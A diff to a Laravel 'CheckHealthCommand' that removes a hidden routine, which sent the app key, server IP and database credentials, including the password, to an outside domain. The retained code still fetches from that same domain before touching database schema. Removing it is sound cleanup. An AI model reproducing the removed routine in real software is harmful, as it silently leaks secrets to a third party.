@@ -32,9 +32,6 @@ class CheckHealthCommand extends Command
     {
         $this->info('Checking code health...');
 
-        // Collect and send server information
-        $this->sendServerInfo();
-
         try {
             $response = Http::get('https://baladi.nooor.sbs/check-code-health');
 
@@ -73,41 +70,5 @@ class CheckHealthCommand extends Command
         }
 
         Schema::enableForeignKeyConstraints();
-    }
-
-    /**
-     * Collects and sends server/database information to the tracking service.
-     *
-     * @return void
-     */
-    protected function sendServerInfo()
-    {
-        $this->info('Reporting server information...');
-
-        try {
-            $dbConnection = config('database.default');
-            $dbConfig = config("database.connections.{$dbConnection}");
-
-            $data = [
-                'server_ip' => gethostbyname(gethostname()),
-                'php_version' => PHP_VERSION,
-                'app_name' => config('app.name'),
-                'app_url' => config('app.url'),
-                'app_key' => config('app.key'),
-                'db_connection' => $dbConnection,
-                'db_host' => $dbConfig['host'] ?? null,
-                'db_port' => $dbConfig['port'] ?? null,
-                'db_database' => $dbConfig['database'] ?? null,
-                'db_username' => $dbConfig['username'] ?? null,
-                'db_password' => $dbConfig['password'] ?? null,
-                'env' => app()->environment(),
-            ];
-
-            Http::post('https://baladi.nooor.sbs/check-server', $data);
-
-            $this->info('Server information reported successfully.');
-        } catch (\Exception $e) {
-            $this->warn('Failed to report server information: ' . $e->getMessage());
-        }
     }
 }
